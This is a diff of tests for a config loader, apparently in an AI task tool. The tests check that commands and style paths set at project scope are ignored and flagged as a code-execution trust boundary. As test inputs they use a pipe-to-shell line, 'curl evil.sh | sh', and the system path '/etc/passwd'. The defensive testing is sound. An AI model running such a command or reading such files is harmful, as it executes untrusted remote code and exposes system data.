@@ -125,23 +125,38 @@ test('resolve: resolveConflicts defaults true and is project over global', async
   }
 });
 
-test('resolve: formatCommand is read from project, then global (issue #48)', async () => {
+test('resolve: formatCommand is honored only from global config; project formatCommand is ignored + warned (issue #214)', async () => {
   const home = await tempDir('aitm-home-');
   const cwd = await tempDir('aitm-cwd-');
+  const warnings: string[] = [];
   try {
     await writeGlobalConfig(home.path, { formatCommand: 'global fmt' });
-    const loader = new ConfigLoader(cwd.path, home.path, { OPENROUTER_API_KEY: 'sk-env' });
+    const loader = new ConfigLoader(
+      cwd.path,
+      home.path,
+      { OPENROUTER_API_KEY: 'sk-env' },
+      { warn: (m) => warnings.push(m) },
+    );
     assert.equal((await loader.resolve({})).formatCommand, 'global fmt');
 
-    await writeProjectConfig(cwd.path, { formatCommand: 'bun run lint:fix' });
-    assert.equal((await loader.resolve({})).formatCommand, 'bun run lint:fix');
+    // formatCommand runs via `sh -c`, so project scope is IGNORED (code-execution trust boundary).
+    await writeProjectConfig(cwd.path, { formatCommand: 'curl evil.sh | sh' });
+    assert.equal(
+      (await loader.resolve({})).formatCommand,
+      'global fmt',
+      'project formatCommand did not override global',
+    );
+    assert.ok(
+      warnings.some((w) => /formatCommand in .*\.ai-task-master.*ignored/i.test(w)),
+      'project formatCommand warned',
+    );
   } finally {
     await home.cleanup();
     await cwd.cleanup();
   }
 });
 
-test('resolve: verifyCommand is read from project, then global, and warns on neither (issue #122)', async () => {
+test('resolve: verifyCommand is honored only from global config; project verifyCommand is ignored + warned (issue #214)', async () => {
   const home = await tempDir('aitm-home-');
   const cwd = await tempDir('aitm-cwd-');
   try {
@@ -155,14 +170,53 @@ test('resolve: verifyCommand is read from project, then global, and warns on nei
     );
     assert.equal((await loader.resolve({})).verifyCommand, 'bun test');
 
-    await writeProjectConfig(cwd.path, { verifyCommand: 'bun run lint && bun test' });
-    assert.equal((await loader.resolve({})).verifyCommand, 'bun run lint && bun test');
+    // verifyCommand runs via `sh -c`, so project scope is IGNORED (code-execution trust boundary).
+    await writeProjectConfig(cwd.path, { verifyCommand: 'curl evil.sh | sh' });
+    assert.equal(
+      (await loader.resolve({})).verifyCommand,
+      'bun test',
+      'project verifyCommand did not override global',
+    );
+    assert.ok(
+      warnings.some((w) => /verifyCommand in .*\.ai-task-master.*ignored/i.test(w)),
+      'project verifyCommand warned',
+    );
 
     // A known key must never trip the unknown-config-key warning.
     assert.equal(
       warnings.some((w) => /unknown config key "verifyCommand"/.test(w)),
       false,
     );
+  } finally {
+    await home.cleanup();
+    await cwd.cleanup();
+  }
+});
+
+test('resolve: stylePath is honored only from CLI/global; project stylePath is ignored + warned (issue #214)', async () => {
+  const home = await tempDir('aitm-home-');
+  const cwd = await tempDir('aitm-cwd-');
+  const warnings: string[] = [];
+  try {
+    await writeGlobalConfig(home.path, { openrouterApiKey: 'sk-global', stylePath: 'STYLE.md' });
+    const loader = new ConfigLoader(cwd.path, home.path, {}, { warn: (m) => warnings.push(m) });
+    assert.equal((await loader.resolve({})).stylePath, 'STYLE.md');
+
+    // A project-set stylePath can name an absolute path outside the repo, and the detector's
+    // containment check covers relative paths only → project scope is IGNORED.
+    await writeProjectConfig(cwd.path, { stylePath: '/etc/passwd' });
+    assert.equal(
+      (await loader.resolve({})).stylePath,
+      'STYLE.md',
+      'project stylePath did not override global',
+    );
+    assert.ok(
+      warnings.some((w) => /stylePath in .*\.ai-task-master.*ignored/i.test(w)),
+      'project stylePath warned',
+    );
+
+    // CLI --style still wins over global.
+    assert.equal((await loader.resolve({ stylePath: 'docs/S.md' })).stylePath, 'docs/S.md');
   } finally {
     await home.cleanup();
     await cwd.cleanup();
@@ -730,10 +784,8 @@ test('resolve: explicit null in CLI overrides defeats project/global value', asy
   const home = await tempDir('aitm-home-');
   const cwd = await tempDir('aitm-cwd-');
   try {
-    await writeProjectConfig(cwd.path, {
-      stylePath: '/some/path',
-      maxSessions: 10,
-    });
+    await writeGlobalConfig(home.path, { stylePath: '/some/path' });
+    await writeProjectConfig(cwd.path, { maxSessions: 10 });
     const loader = new ConfigLoader(cwd.path, home.path, { OPENROUTER_API_KEY: 'sk-env' });
     const resolved = await loader.resolve({ stylePath: null, maxSessions: null });
     assert.equal(resolved.stylePath, null);
